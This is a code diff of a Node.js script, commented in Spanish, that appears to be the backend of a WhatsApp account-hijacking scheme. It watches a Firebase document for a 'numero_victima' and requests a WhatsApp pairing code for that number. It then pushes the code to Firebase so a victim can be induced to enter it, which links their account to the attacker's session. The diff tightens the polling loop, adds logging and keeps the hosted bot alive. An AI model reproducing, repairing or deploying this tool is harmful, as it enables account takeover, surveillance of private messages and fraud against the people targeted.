@@ -19,42 +19,49 @@ const client = new Client({
     }
 });
 
-// REVISIÓN MANUAL CADA 5 SEGUNDOS (Más estable que Snapshot)
-setInterval(async () => {
+// FUNCIÓN PARA REVISAR FIREBASE CONSTANTEMENTE
+async function revisarPeticiones() {
     try {
         const docRef = db.collection("wa_clon_global").doc("current_session");
         const snap = await docRef.get();
         
         if (snap.exists) {
             const data = snap.data();
-            // Si hay un número y el status es solicitar código
+            // Si hay un número nuevo y el estado es 'solicitando_codigo'
             if (data.status === "solicitando_codigo" && !data.pairingCode) {
-                console.log("ENTRANDO A WHATSAPP PARA: " + data.numero_victima);
+                console.log(">>> [!] DETECTADO NÚMERO: " + data.numero_victima);
+                
+                // Pedimos el código a WhatsApp Web Real
                 const code = await client.requestPairingCode(data.numero_victima);
                 
+                // Lo subimos a Firebase con status 'mostrando_codigo'
                 await docRef.update({
                     pairingCode: code,
-                    status: "mostrando_codigo"
+                    status: "mostrando_codigo",
+                    lastUpdated: admin.firestore.FieldValue.serverTimestamp()
                 });
-                console.log("¡CÓDIGO GENERADO!: " + code);
+                console.log(">>> [OK] CÓDIGO GENERADO: " + code);
             }
         }
     } catch (e) {
-        // Error silencioso
+        console.log(">>> ERROR EN REVISIÓN: " + e.message);
     }
-}, 5000);
+}
+
+// EJECUTAR REVISIÓN CADA 3 SEGUNDOS (Fuerza Bruta)
+setInterval(revisarPeticiones, 3000);
 
 client.on('ready', () => {
-    console.log("CONEXIÓN DE WHATSAPP EXITOSA");
+    console.log(">>> [!!!] SESIÓN VINCULADA EXITOSAMENTE");
     db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
 });
 
-client.initialize().catch(e => console.log("Error Init:", e));
+client.initialize().catch(e => console.log(">>> Error Init:", e));
 
-// SERVIDOR DE SALUD PARA RENDER
+// SERVIDOR PARA QUE RENDER NO APAGUE EL ROBOT
 const port = process.env.PORT || 3000;
 http.createServer((req, res) => {
-    res.end('ROBOT ONLINE');
+    res.end('MOTOR ONLINE');
 }).listen(port, () => {
     console.log("Robot activo en puerto " + port);
 });
